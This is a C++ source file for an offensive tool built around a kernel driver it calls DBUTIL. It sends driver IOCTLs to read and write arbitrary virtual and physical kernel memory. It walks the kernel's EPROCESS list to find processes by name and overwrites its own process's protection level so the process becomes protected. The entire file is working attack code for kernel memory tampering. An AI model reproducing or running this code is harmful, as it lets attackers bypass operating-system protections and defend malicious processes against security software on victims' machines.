#include "dbutil.h"

DBUTIL::DBUTIL() {
	// Constructor for Memory Manager
	HANDLE hDevice = CreateFileW(wszDrive, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	DWORD errorCode = GetLastError();
	if (errorCode != 0) {
		printf("Error code %lu\n", errorCode);
		printf("[!] Could not create a handle to driver. Aborting.\n");
	}
	DBUTIL::DriverHandle = hDevice;
	printf("[+] Driver handle created.\n");
}

DBUTIL::~DBUTIL() {
	// Close Handle to driver. If it was obtained in constructor
	if (DBUTIL::DriverHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(DBUTIL::DriverHandle);
		DBUTIL::DriverHandle = INVALID_HANDLE_VALUE;
		printf("[!] Handle to driver closed!\n");
	}
	printf("[!] Close but INVALID_HANDLE_VALUE?\n");

}

BOOL DBUTIL::VirtualRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, 0x8);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, 0x8);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, 0x8);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle, IOCTL_VIRTUAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x18], bytesToRead);
	//memcpy(buffer, &tempBuffer[sizeof(OB_CALLBACK_ENTRY)], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL DBUTIL::VirtualWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x18], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle, IOCTL_VIRTUAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL DBUTIL::PhysicalRead(_In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle, IOCTL_PHYSICAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x10], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

BOOL DBUTIL::PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x10], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(DBUTIL::DriverHandle, IOCTL_PHYSICAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}

DWORD64 DBUTIL::GetKernelBase(_In_ std::string name) {
	/* Gets the base address (VIRTUAL ADDRESS) of a module in kernel address space */
	// Defining EnumDeviceDrivers() and GetDeviceDriverBaseNameA() parameters
	LPVOID lpImageBase[1024]{};
	DWORD lpcbNeeded{};
	int drivers{};
	char lpFileName[1024]{};
	DWORD64 imageBase{};
	// Grabs an array of all of the device drivers
	BOOL success = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);
	// Makes sure that we successfully grabbed the drivers
	if (!success)
	{
		printf("Unable to invoke EnumDeviceDrivers()!\n");
		return 0;
	}
	// Defining number of drivers for GetDeviceDriverBaseNameA()
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);
	// Parsing loaded drivers
	for (int i = 0; i < drivers; i++) {
		// Gets the name of the driver
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);
		// Compares the indexed driver and with our specified driver name
		if (!strcmp(name.c_str(), lpFileName)) {
			imageBase = (DWORD64)lpImageBase[i];
			//Logger::InfoHex("Found Image Base for " + name, imageBase);
			//printf("Found Image Base for %s 0x%lu\n", name.c_str(), imageBase);
			break;
		}
	}
	return imageBase;
}

MY_STRUCT DBUTIL::GetEPROCESSPointer(_In_ DWORD64 ntoskrnlBase, _In_ std::vector<std::string> processNames) {
	/* Returns the pointer (VIRTUAL ADDRESS) to an EPROCESS struct for a specified process name*/
	// Gets PsInitialSystemProcess address from ntoskrnl exports
	// Maps the ntoskrnl file to memory
	MY_STRUCT ret;
	HANDLE handleToFile = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE handleToMap = CreateFileMapping(handleToFile, NULL, PAGE_READONLY, 0, 0, NULL);
	PBYTE srcFile = (PBYTE)MapViewOfFile(handleToMap, FILE_MAP_READ, 0, 0, 0);
	if (!srcFile) {
		printf("Failed to open ntoskrnl!\n");
		ret.flag = false;
		return ret;
	}
	// Gets the DOS header from the file map
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)srcFile;
	// Gets the NT header from the dos header
	IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64*)((PBYTE)dosHeader + dosHeader->e_lfanew);
	// Gets the Exports data directory information
	IMAGE_DATA_DIRECTORY* exportDirInfo = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// Gets the first section data header to start iterating through
	IMAGE_SECTION_HEADER* firstSectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	// Loops Through Each Section to find export table
	DWORD64 PsIntialSystemProcessOffset{};
	for (DWORD i{}; i < ntHeader->FileHeader.NumberOfSections; i++) {
		auto section = &firstSectionHeader[i];
		// Checks if our export address table is within the given section
		if (section->VirtualAddress <= exportDirInfo->VirtualAddress && exportDirInfo->VirtualAddress < (section->VirtualAddress + section->Misc.VirtualSize)) {
			// If so, put the export data in our variable and exit the for loop
			IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)dosHeader + section->PointerToRawData + (DWORD64)exportDirInfo->VirtualAddress - section->VirtualAddress);
			// Iterates through the names to find the PsInitialSystemProcess export
			DWORD* funcNames = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfNames + section->PointerToRawData - section->VirtualAddress);
			DWORD* funcAddresses = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfFunctions + section->PointerToRawData - section->VirtualAddress);
			WORD* funcOrdinals = (WORD*)((PBYTE)srcFile + exportDirectory->AddressOfNameOrdinals + section->PointerToRawData - section->VirtualAddress);
			for (DWORD j{}; j < exportDirectory->NumberOfNames; j++) {
				LPCSTR name = (LPCSTR)(srcFile + funcNames[j] + section->PointerToRawData - section->VirtualAddress);
				if (!strcmp(name, "PsInitialSystemProcess")) {
					PsIntialSystemProcessOffset = funcAddresses[funcOrdinals[j]];
					break;
				}
			}
			break;
		}
	}
	// Checks if we found the offset
	if (!PsIntialSystemProcessOffset) {
		printf("Failed to find PsInitialSystemProcess offset!\n");
		ret.flag = false;
		return ret;
	}
	// Reads the PsInitialSystemProcess Address
	DWORD64 initialSystemProcess{};
	this->VirtualRead(ntoskrnlBase + PsIntialSystemProcessOffset, &initialSystemProcess, sizeof(DWORD64));
	if (!initialSystemProcess) {
		printf("Failed to VirtualRead PsInitialSystemProcess offset!\n");
		ret.flag = false;
		return ret;
	}
	// Reads ActiveProcessLinks of the system process to iterate through all processes
	LIST_ENTRY activeProcessLinks;
	this->VirtualRead(initialSystemProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
	// Prepares input string for search algorithm below
	// const char* inputName = processName.c_str(); CHANGED
	// Sets up a current process tracker as we iterate through all of the processes
	DWORD64 currentProcess{};
	//UCHAR currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// TODO: LENGHT FOR NAMES IS LIMITED TO 15 CHAR's
	UCHAR currentProcessName[MAX_PATH]{}; // TODO: LENGHT FOR NAMES IS LIMITED TO 15 CHAR's
	//unsigned long long* currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// Loops through the process list three times to find the PID we're looking for

	// added:
	std::vector<std::string> matchNames;
	std::vector<DWORD64> matchEprocess;
	for (DWORD i{}; i < 1; i++) {
		do {
			// Initializes the currentProcess tracker with the process that comes after System
			this->VirtualRead((DWORD64)activeProcessLinks.Flink, &currentProcess, sizeof(DWORD64));
			// Subtracts the offset of the activeProcessLinks offset as an activeProcessLink
			// points to the activeProcessLinks of another EPROCESS struct
			currentProcess -= EPROCESS_ACTIVEPROCESSLINKS;
			// Gets the Name of currentProcess
			//this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, sizeof(currentProcessName));
			this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, MAX_PATH);
			// Checks if the currentProcess is the one we're looking for
			//DBUTIL::InfoHex((const char*)currentProcessName, strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE));
			//printf("Comparing current Process: %s with %s\n", *currentProcessName, inputName);
			//printf("Comparing current Process: %s with %s\n", reinterpret_cast<const char*>(currentProcessName), inputName);
			//if (strncmp(*currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
			//if (strncmp(reinterpret_cast<const char*>(currentProcessName), inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
			const char* cur = reinterpret_cast<const char*>(currentProcessName);
			for (size_t i = 0; i < processNames.size(); i++) {
				const char* inputName = processNames[i].c_str();
				//printf("Comparing current Process: %s with %s\n", cur, inputName);
				if (strcmp(cur, inputName) == 0) {
					bool represented = false;
					for (auto& item : matchNames) {
						if (item == processNames[i]) {
							represented = true;
						}
					}
					if (!represented) {
						printf("Add EPROCESS to list\n");
						matchNames.push_back(processNames[i]);
						matchEprocess.push_back(currentProcess);
					}
				}
			}
			/*if (strcmp(reinterpret_cast<const char*>(currentProcessName), inputName) == 0) {
				printf("Eprocess found\n");
				// If it is the process, return the pointer to the EPROCESS struct
				return currentProcess;
			}*/
			// If not, update the activeProcessLinks entry with the list entry from currentprocess
			this->VirtualRead(currentProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
			//} while (strncmp(*currentProcessName, SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
		} while (strncmp(reinterpret_cast<const char*>(currentProcessName), SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
	}
	// Will return NULL if the process is not found after 3 iterations
	if (ret.names.size() != 0) {
		ret.names = matchNames;
		ret.eprocess = matchEprocess;
		ret.flag = true;
		return ret;
	}
	ret.names = matchNames;
	ret.eprocess = matchEprocess;
	ret.flag = false;
	return ret;
}

MY_STRUCT DBUTIL::GetAllEPROCESSPointer(_In_ DWORD64 ntoskrnlBase) {
	/* Returns the pointer (VIRTUAL ADDRESS) to an EPROCESS struct for a specified process name*/
	// Gets PsInitialSystemProcess address from ntoskrnl exports
	// Maps the ntoskrnl file to memory
	MY_STRUCT ret;
	HANDLE handleToFile = CreateFileW(L"C:\\Windows\\System32\\ntoskrnl.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE handleToMap = CreateFileMapping(handleToFile, NULL, PAGE_READONLY, 0, 0, NULL);
	PBYTE srcFile = (PBYTE)MapViewOfFile(handleToMap, FILE_MAP_READ, 0, 0, 0);
	if (!srcFile) {
		printf("Failed to open ntoskrnl!\n");
		ret.flag = false;
		return ret;
	}
	// Gets the DOS header from the file map
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)srcFile;
	// Gets the NT header from the dos header
	IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64*)((PBYTE)dosHeader + dosHeader->e_lfanew);
	// Gets the Exports data directory information
	IMAGE_DATA_DIRECTORY* exportDirInfo = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// Gets the first section data header to start iterating through
	IMAGE_SECTION_HEADER* firstSectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	// Loops Through Each Section to find export table
	DWORD64 PsIntialSystemProcessOffset{};
	for (DWORD i{}; i < ntHeader->FileHeader.NumberOfSections; i++) {
		auto section = &firstSectionHeader[i];
		// Checks if our export address table is within the given section
		if (section->VirtualAddress <= exportDirInfo->VirtualAddress && exportDirInfo->VirtualAddress < (section->VirtualAddress + section->Misc.VirtualSize)) {
			// If so, put the export data in our variable and exit the for loop
			IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)dosHeader + section->PointerToRawData + (DWORD64)exportDirInfo->VirtualAddress - section->VirtualAddress);
			// Iterates through the names to find the PsInitialSystemProcess export
			DWORD* funcNames = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfNames + section->PointerToRawData - section->VirtualAddress);
			DWORD* funcAddresses = (DWORD*)((PBYTE)srcFile + exportDirectory->AddressOfFunctions + section->PointerToRawData - section->VirtualAddress);
			WORD* funcOrdinals = (WORD*)((PBYTE)srcFile + exportDirectory->AddressOfNameOrdinals + section->PointerToRawData - section->VirtualAddress);
			for (DWORD j{}; j < exportDirectory->NumberOfNames; j++) {
				LPCSTR name = (LPCSTR)(srcFile + funcNames[j] + section->PointerToRawData - section->VirtualAddress);
				if (!strcmp(name, "PsInitialSystemProcess")) {
					PsIntialSystemProcessOffset = funcAddresses[funcOrdinals[j]];
					break;
				}
			}
			break;
		}
	}
	// Checks if we found the offset
	if (!PsIntialSystemProcessOffset) {
		printf("Failed to find PsInitialSystemProcess offset!\n");
		ret.flag = false;
		return ret;
	}
	// Reads the PsInitialSystemProcess Address
	DWORD64 initialSystemProcess{};
	this->VirtualRead(ntoskrnlBase + PsIntialSystemProcessOffset, &initialSystemProcess, sizeof(DWORD64));
	if (!initialSystemProcess) {
		printf("Failed to VirtualRead PsInitialSystemProcess offset!\n");
		ret.flag = false;
		return ret;
	}
	// Reads ActiveProcessLinks of the system process to iterate through all processes
	LIST_ENTRY activeProcessLinks;
	this->VirtualRead(initialSystemProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
	// Prepares input string for search algorithm below
	// const char* inputName = processName.c_str(); CHANGED
	// Sets up a current process tracker as we iterate through all of the processes
	DWORD64 currentProcess{};
	//UCHAR currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// TODO: LENGHT FOR NAMES IS LIMITED TO 15 CHAR's
	UCHAR currentProcessName[MAX_PATH]{}; // TODO: LENGHT FOR NAMES IS LIMITED TO 15 CHAR's
	//unsigned long long* currentProcessName[EPROCESS_MAX_NAME_SIZE]{};
	// Loops through the process list three times to find the PID we're looking for

	// added:
	std::vector<std::string> matchNames;
	std::vector<DWORD64> matchEprocess;
	std::vector<BOOL> protections;
	for (DWORD i{}; i < 1; i++) {
		do {
			// Initializes the currentProcess tracker with the process that comes after System
			this->VirtualRead((DWORD64)activeProcessLinks.Flink, &currentProcess, sizeof(DWORD64));
			// Subtracts the offset of the activeProcessLinks offset as an activeProcessLink
			// points to the activeProcessLinks of another EPROCESS struct
			currentProcess -= EPROCESS_ACTIVEPROCESSLINKS;
			// Gets the Name of currentProcess
			//this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, sizeof(currentProcessName));
			this->VirtualRead(currentProcess + EPROCESS_NAME, &currentProcessName, MAX_PATH);
			// Checks if the currentProcess is the one we're looking for
			//DBUTIL::InfoHex((const char*)currentProcessName, strncmp((const char*)currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE));
			//printf("Comparing current Process: %s with %s\n", *currentProcessName, inputName);
			//printf("Comparing current Process: %s with %s\n", reinterpret_cast<const char*>(currentProcessName), inputName);
			//if (strncmp(*currentProcessName, inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
			//if (strncmp(reinterpret_cast<const char*>(currentProcessName), inputName, EPROCESS_MAX_NAME_SIZE) == 0) {
			const char* cur = reinterpret_cast<const char*>(currentProcessName);
			bool represented = false;
			for (auto& item : matchNames) {
				if (strcmp(cur, item.c_str()) == 0) { // viel lieber normale compare
					represented = true;
				}
			}
			if (!represented) {
				std::string name = cur;
				matchNames.push_back(name);
				matchEprocess.push_back(currentProcess);
				protections.push_back(false);
			}
			// If not, update the activeProcessLinks entry with the list entry from currentprocess
			this->VirtualRead(currentProcess + EPROCESS_ACTIVEPROCESSLINKS, &activeProcessLinks, sizeof(activeProcessLinks));
			//} while (strncmp(*currentProcessName, SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
		} while (strncmp(reinterpret_cast<const char*>(currentProcessName), SYSTEM_NAME, EPROCESS_MAX_NAME_SIZE) != 0);
	}
	ret.names = matchNames;
	ret.eprocess = matchEprocess;
	ret.protection = protections;
	ret.flag = true;
	return ret;
}

//DWORD64 GetSafeEPROCESSPointer(_In_ DWORD64 ntoskrnlBase) {
DWORD64 DBUTIL::GetSelfEPROCESSAddress() {
	NTSTATUS status;
	DWORD currentProcessID = GetCurrentProcessId();

	// Open an handle to our own process.
	HANDLE selfProcessHandle = OpenProcess(SYNCHRONIZE, FALSE, currentProcessID);
	printf("[*] [ProcessProtection] Self process handle: 0x%hx\n", (USHORT)((ULONG_PTR)selfProcessHandle));

	// Retrieves the native NtQuerySystemInformation function from ntdll.
	HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
	if (!hNtdll) {
		//_putts_or_not(TEXT("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process"));
		printf("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process");
		return 0x0;
	}
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		//_putts_or_not(TEXT("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process"));
		printf("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process\n");
		return 0x0;
	}

	/*
	* Retrieves all the handle table using NtQuerySystemInformation.
	* Looping until NtQuerySystemInformation has sufficient space to do so (i.e does not return a STATUS_INFO_LENGTH_MISMATCH).
	* Possible alternative to explore woule be to use the ReturnLength returned by NtQuerySystemInformation.
	*/
	ULONG SystemHandleInformationSize = SystemHandleInformationBaseSize;
	PSYSTEM_HANDLE_INFORMATION tmpHandleTableInformation = NULL;
	PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
	if (!pHandleTableInformation) {
		//_putts_or_not(TEXT("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process"));
		printf("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process\n");
		return 0x0;
	}
	status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		SystemHandleInformationSize = SystemHandleInformationSize * 2;
		tmpHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleTableInformation, SystemHandleInformationSize);
		if (!tmpHandleTableInformation) {
			printf("[!] ERROR: could not realloc memory for the handle table to find the EPROCESS struct of the current process\n");
			return 0x0;
		}
		pHandleTableInformation = tmpHandleTableInformation;
		status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
	}
	if (!NT_SUCCESS(status)) {
		printf("[!] ERROR: could not retrieve the HandleTableInformation to find the EPROCESS struct of the current process\n");
		return 0x0;
	}

	// Iterates through all the handles.
	DWORD64 returnAddress = 0x0;
	for (DWORD i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];

		// Only retrieves the handles associated with our own process.
		if (handleInfo.UniqueProcessId != currentProcessID) {
			continue;
		}

		if (handleInfo.HandleValue == (USHORT)((ULONG_PTR)selfProcessHandle)) {
			printf("[+] [ProcessProtection] Found the handle of the current process (PID: %hu): 0x%hx at 0x%I64x\n", handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
			returnAddress = (DWORD64)handleInfo.Object;
			break;
		}
	}
	free(pHandleTableInformation);
	CloseHandle(selfProcessHandle);
	return returnAddress;
}

int DBUTIL::SetCurrentProcessAsProtected() {
	DWORD64 processEPROCESSAddress = this->GetSelfEPROCESSAddress();
	if (processEPROCESSAddress == 0x0) {
		printf("[!] ERROR: could not find the EPROCCES struct of the current process to self protect\n");
		return -1;
	}
	//_tprintf_or_not(TEXT("[+] [ProcessProtection] Found self process EPROCCES struct at 0x%I64x\n"), processEPROCESSAddress);
	printf("[+][ProcessProtection] Found self process EPROCCES struct at 0x % I64x\n", processEPROCESSAddress);

	// Sets the current process EPROCESS's ProtectionLevel as Light WinTcb (PS_PROTECTED_WINTCB_LIGHT, currently 0x61).
	DWORD64 processSignatureLevelAddress = processEPROCESSAddress + 0x87a;

	//UCHAR flagPPLWinTcb = ((UCHAR)((PsProtectedSignerWinTcb) << 4)) | ((UCHAR)(PsProtectedTypeProtectedLight));
	// PS_PROTECTED, currently 0x91
	UCHAR flagPPLWinTcb = ((UCHAR)((PsProtectedSignerMax) << 7)) | ((UCHAR)(3));
	printf("[*] [ProcessProtection] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0x%I64x) to 0x%hx (PS_PROTECTED_WINTCB_LIGHT)\n", processSignatureLevelAddress, flagPPLWinTcb);
	//WriteMemoryWORD(processSignatureLevelAddress, flagPPLWinTcb);
	this->VirtualWrite(processSignatureLevelAddress, &flagPPLWinTcb, 8);

	return 0;
}
